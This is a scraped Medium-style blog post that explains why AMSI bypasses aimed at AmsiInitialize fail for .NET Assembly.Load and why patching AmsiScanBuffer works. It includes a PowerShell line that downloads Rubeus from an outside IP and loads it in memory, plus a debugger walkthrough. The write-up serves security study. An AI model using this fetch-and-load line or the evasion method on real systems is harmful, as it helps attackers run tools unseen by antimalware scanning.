https://miro.medium.com/v2/resize:fit:786/format:webp/0*4pfK9pvp7NE33hSz.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*4pfK9pvp7NE33hSz.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*4pfK9pvp7NE33hSz.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*4pfK9pvp7NE33hSz.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*4pfK9pvp7NE33hSz.png 640w, https://miro.medium.com/v2/resize:fit:720/0*4pfK9pvp7NE33hSz.png 720w, https://miro.medium.com/v2/resize:fit:750/0*4pfK9pvp7NE33hSz.png 750w, https://miro.medium.com/v2/resize:fit:786/0*4pfK9pvp7NE33hSz.png 786w, https://miro.medium.com/v2/resize:fit:828/0*4pfK9pvp7NE33hSz.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*4pfK9pvp7NE33hSz.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*4pfK9pvp7NE33hSz.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="237" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*4pfK9pvp7NE33hSz.png"></picture></div></div></figure><h1 id="55ff" class="mi mj gr bc mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf bh" data-selectable-paragraph="">Bypass AMSI for Assembly Load</h1><p id="b4e4" class="pw-post-body-paragraph ng nh gr ni b nj nk nl nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od gk bh" data-selectable-paragraph="">We discussed how to bypass AMSI before executing powershell scripts. However, the content of .NET assembly will also be scanned by AMSI, and the process is slightly different. As a result, attacking AmsiInitialize or AmsiOpenSession does not work.</p><p id="3095" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">We can use reflection to download a C# tool in memory and execute it.</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="9dd9" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph=""><span class="hljs-meta.prompt">$</span>data=(new-object System.Net.WebClient).DownloadData(‘http://192.168.0.45:443/rubeus.exe’)<br><span class="hljs-meta.prompt">$</span>assembly=[System.Reflection.Assembly]::Load($data)</span></pre><p id="559d" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">As the following 2 screenshots show, we already bypassed AMSI by attacking AmsiOpenSession and AmsiInitialize, but we cannot load Rubeus in memory.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of qh"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*M8TDEw62U-6a8wtv.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*M8TDEw62U-6a8wtv.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*M8TDEw62U-6a8wtv.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*M8TDEw62U-6a8wtv.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*M8TDEw62U-6a8wtv.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*M8TDEw62U-6a8wtv.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*M8TDEw62U-6a8wtv.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*M8TDEw62U-6a8wtv.png 640w, https://miro.medium.com/v2/resize:fit:720/0*M8TDEw62U-6a8wtv.png 720w, https://miro.medium.com/v2/resize:fit:750/0*M8TDEw62U-6a8wtv.png 750w, https://miro.medium.com/v2/resize:fit:786/0*M8TDEw62U-6a8wtv.png 786w, https://miro.medium.com/v2/resize:fit:828/0*M8TDEw62U-6a8wtv.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*M8TDEw62U-6a8wtv.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*M8TDEw62U-6a8wtv.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="286" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*M8TDEw62U-6a8wtv.png"></picture></div></div></figure><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of qi"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*VxGHeTWYsvO7BJwu.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*VxGHeTWYsvO7BJwu.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*VxGHeTWYsvO7BJwu.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*VxGHeTWYsvO7BJwu.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*VxGHeTWYsvO7BJwu.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*VxGHeTWYsvO7BJwu.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*VxGHeTWYsvO7BJwu.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*VxGHeTWYsvO7BJwu.png 640w, https://miro.medium.com/v2/resize:fit:720/0*VxGHeTWYsvO7BJwu.png 720w, https://miro.medium.com/v2/resize:fit:750/0*VxGHeTWYsvO7BJwu.png 750w, https://miro.medium.com/v2/resize:fit:786/0*VxGHeTWYsvO7BJwu.png 786w, https://miro.medium.com/v2/resize:fit:828/0*VxGHeTWYsvO7BJwu.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*VxGHeTWYsvO7BJwu.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*VxGHeTWYsvO7BJwu.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="265" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*VxGHeTWYsvO7BJwu.png"></picture></div></div></figure><p id="0c98" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">However, if we patch AmsiScanBuffer, we will be fine and successfully load Rubeus in memory.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of qj"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*pkKNhvWefQWsFYc-.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*pkKNhvWefQWsFYc-.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*pkKNhvWefQWsFYc-.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*pkKNhvWefQWsFYc-.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*pkKNhvWefQWsFYc-.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*pkKNhvWefQWsFYc-.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*pkKNhvWefQWsFYc-.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*pkKNhvWefQWsFYc-.png 640w, https://miro.medium.com/v2/resize:fit:720/0*pkKNhvWefQWsFYc-.png 720w, https://miro.medium.com/v2/resize:fit:750/0*pkKNhvWefQWsFYc-.png 750w, https://miro.medium.com/v2/resize:fit:786/0*pkKNhvWefQWsFYc-.png 786w, https://miro.medium.com/v2/resize:fit:828/0*pkKNhvWefQWsFYc-.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*pkKNhvWefQWsFYc-.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*pkKNhvWefQWsFYc-.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="62" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*pkKNhvWefQWsFYc-.png"></picture></div></div></figure><p id="8bc8" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Why? Because when <strong class="ni gs">Assembly.Load() </strong>method is used, function <strong class="ni gs">AmsiScan </strong>in <strong class="ni gs">clr.dll </strong>will be called additionally.</p><p id="0f56" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Set 4 breakpoints for powershell.exe process</p><p id="03f8" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph=""><strong class="ni gs">amsi!AmsiInitialize<br>amsi!AmsiOpenSession<br>amsi!AmsiScanBuffer<br>clr!AmsiScan</strong></p><p id="3e80" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">After supplying malicious content “invoke-mimikatz”, breakpoints at AmsiOpenSession and AmsiScanbuffer are reached, but functions <strong class="ni gs">AmsiInitialize</strong> and <strong class="ni gs">AmsiScan </strong>are not called。</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of qk"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*5CJcYh4a8BelZZUQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*5CJcYh4a8BelZZUQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*5CJcYh4a8BelZZUQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*5CJcYh4a8BelZZUQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*5CJcYh4a8BelZZUQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*5CJcYh4a8BelZZUQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*5CJcYh4a8BelZZUQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*5CJcYh4a8BelZZUQ.png 640w, https://miro.medium.com/v2/resize:fit:720/0*5CJcYh4a8BelZZUQ.png 720w, https://miro.medium.com/v2/resize:fit:750/0*5CJcYh4a8BelZZUQ.png 750w, https://miro.medium.com/v2/resize:fit:786/0*5CJcYh4a8BelZZUQ.png 786w, https://miro.medium.com/v2/resize:fit:828/0*5CJcYh4a8BelZZUQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*5CJcYh4a8BelZZUQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*5CJcYh4a8BelZZUQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="154" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*5CJcYh4a8BelZZUQ.png"></picture></div></div></figure><p id="f488" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">If executing<strong class="ni gs"> [System.Reflection.Assembly]::Load()</strong> command, we find that the first 2 breakpoints are still reached, and this time, we have three more hits. The 3 more hits prove that .NET assembly in memory is scanned additionally.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of ql"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*2RrZPAJ8kL6Debp1.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*2RrZPAJ8kL6Debp1.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*2RrZPAJ8kL6Debp1.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*2RrZPAJ8kL6Debp1.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*2RrZPAJ8kL6Debp1.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*2RrZPAJ8kL6Debp1.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*2RrZPAJ8kL6Debp1.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*2RrZPAJ8kL6Debp1.png 640w, https://miro.medium.com/v2/resize:fit:720/0*2RrZPAJ8kL6Debp1.png 720w, https://miro.medium.com/v2/resize:fit:750/0*2RrZPAJ8kL6Debp1.png 750w, https://miro.medium.com/v2/resize:fit:786/0*2RrZPAJ8kL6Debp1.png 786w, https://miro.medium.com/v2/resize:fit:828/0*2RrZPAJ8kL6Debp1.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*2RrZPAJ8kL6Debp1.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*2RrZPAJ8kL6Debp1.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="237" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*2RrZPAJ8kL6Debp1.png"></picture></div></div></figure><p id="c898" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Inspect function <strong class="ni gs">AmsiScan</strong> in <strong class="ni gs">clr.dll</strong>, we find that AmsiInitialize and AmsiScan are called, while AmsiOpenSession is not called.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of qm"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*iveKJM_o_a7G8XM_.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*iveKJM_o_a7G8XM_.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*iveKJM_o_a7G8XM_.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*iveKJM_o_a7G8XM_.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*iveKJM_o_a7G8XM_.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*iveKJM_o_a7G8XM_.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*iveKJM_o_a7G8XM_.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*iveKJM_o_a7G8XM_.png 640w, https://miro.medium.com/v2/resize:fit:720/0*iveKJM_o_a7G8XM_.png 720w, https://miro.medium.com/v2/resize:fit:750/0*iveKJM_o_a7G8XM_.png 750w, https://miro.medium.com/v2/resize:fit:786/0*iveKJM_o_a7G8XM_.png 786w, https://miro.medium.com/v2/resize:fit:828/0*iveKJM_o_a7G8XM_.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*iveKJM_o_a7G8XM_.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*iveKJM_o_a7G8XM_.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="369" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*iveKJM_o_a7G8XM_.png"></picture></div></div></figure><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of qn"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*9G2DugkC6y3P46Wm.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*9G2DugkC6y3P46Wm.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*9G2DugkC6y3P46Wm.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*9G2DugkC6y3P46Wm.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*9G2DugkC6y3P46Wm.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*9G2DugkC6y3P46Wm.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*9G2DugkC6y3P46Wm.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*9G2DugkC6y3P46Wm.png 640w, https://miro.medium.com/v2/resize:fit:720/0*9G2DugkC6y3P46Wm.png 720w, https://miro.medium.com/v2/resize:fit:750/0*9G2DugkC6y3P46Wm.png 750w, https://miro.medium.com/v2/resize:fit:786/0*9G2DugkC6y3P46Wm.png 786w, https://miro.medium.com/v2/resize:fit:828/0*9G2DugkC6y3P46Wm.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*9G2DugkC6y3P46Wm.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*9G2DugkC6y3P46Wm.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="260" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*9G2DugkC6y3P46Wm.png"></picture></div></div></figure><p id="d7a5" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">In summary, the one-liner payload that attacks AmsiInitialize does not work because the payload changes sub-values of the <strong class="ni gs">System.Management.Automation</strong> namespace. This namespace is the root namespace for PowerShell; it is not related to .NET assembly scanning. AmsiOpenSession is not called in AmsiScan at all. AmsiScanBuffer is called, therefore, the bypass technique by attacking AmsiScanBuffer still works when loading a .NET assembly.</p><h1 id="6007" class="mi mj gr bc mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf bh" data-selectable-paragraph="">Reference</h1><p id="6715" class="pw-post-body-paragraph ng nh gr ni b nj nk nl nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od gk bh" data-selectable-paragraph=""><a class="af qo" href="https://docs.microsoft.com/en-us/windows/win32/amsi/images/amsi7archi.jpg" rel="noopener ugc nofollow" target="_blank">https://docs.microsoft.com/en-us/windows/win32/amsi/images/amsi7archi.jpg</a><br><a class="af qo" href="https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiinitialize" rel="noopener ugc nofollow" target="_blank">https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiinitialize</a><br><a class="af qo" href="https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiopensession" rel="noopener ugc nofollow" target="_blank">https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiopensession</a><br><a class="af qo" href="https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer" rel="noopener ugc nofollow" target="_blank">https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer</a><br><a class="af qo" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" rel="noopener ugc nofollow" target="_blank">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a><br><a class="af qo" href="https://github.com/rasta-mouse/AmsiScanBufferBypass" rel="noopener ugc nofollow" target="_blank">https://github.com/rasta-mouse/AmsiScanBufferBypass</a><br><a class="af qo" href="https://book.hacktricks.xyz/windows-hardening/windows-av-bypass" rel="noopener ugc nofollow" target="_blank">https://book.hacktricks.xyz/windows-hardening/windows-av-bypass</a><br><a class="af qo" href="https://github.com/TheD1rkMtr/AMSI_patch" rel="noopener ugc nofollow" target="_blank">https://github.com/TheD1rkMtr/AMSI_patch</a><br><a class="af qo" href="https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/" rel="noopener ugc nofollow" target="_blank">https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/</a><br><a class="af qo" href="https://rastamouse.me/memory-patching-amsi-bypass/" rel="noopener ugc nofollow" target="_blank">https://rastamouse.me/memory-patching-amsi-bypass/</a><br><a class="af qo" href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/" rel="noopener ugc nofollow" target="_blank">https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/</a><br><a class="af qo" href="https://cyberwarfare.live/assembly-load-writing-one-byte-to-evade-amsi-scan/" rel="noopener ugc nofollow" target="_blank">https://cyberwarfare.live/assembly-load-writing-one-byte-to-evade-amsi-scan/</a></p></div></div></div></div></section></div></div></article><div class="ab by"><div class="cf be fw fx fy fz"></div></div></div><div></div><div class="m tm tn to"><div class="bu tp tq be xe" style="bottom: 0px;"><div class="ts t tt v tu tv tw tx ty tz ab q cl fg"><div class="ua ub uc ud ue l"><div class="am l fp uf ug"><div class="h k"><div class="l fg n uh"><button class="af ag ah ai aj ak al am an ao ap aq ar as at ab" data-testid="close-button" aria-label="close"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" class="fh dr fj fi"><path d="M5 5l7 7m7 7l-7-7m0 0l7-7m-7 7l-7 7" stroke="currentColor" stroke-linecap="round"></path></svg></button></div></div><div class="j i d"><div class="l fg n uh"><button class="af ag ah ai aj ak al am an ao ap aq ar as at ab fg ui gn uj uk ul um" data-testid="close-button" aria-label="close"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" class="fh dr fj fi"><path d="M5 5l7 7m7 7l-7-7m0 0l7-7m-7 7l-7 7" stroke="currentColor" stroke-linecap="round"></path></svg></button></div></div></div><div class="ab q iv iw uu uv"><img class="fp tn gf uw" src="https://miro.medium.com/v2/da:true/resize:fit:0/5c50caa54067fd622d2f0fac18392213bf92f6e2fae89b691e62bceb40885e74" loading="lazy" role="presentation"><div class="gv ux ha uy dj uz dk va vb l"><svg viewBox="0 0 3940 610" class="un uo up uq ur hf us hk ut hp"><path d="M594.79 308.2c0 163.76-131.85 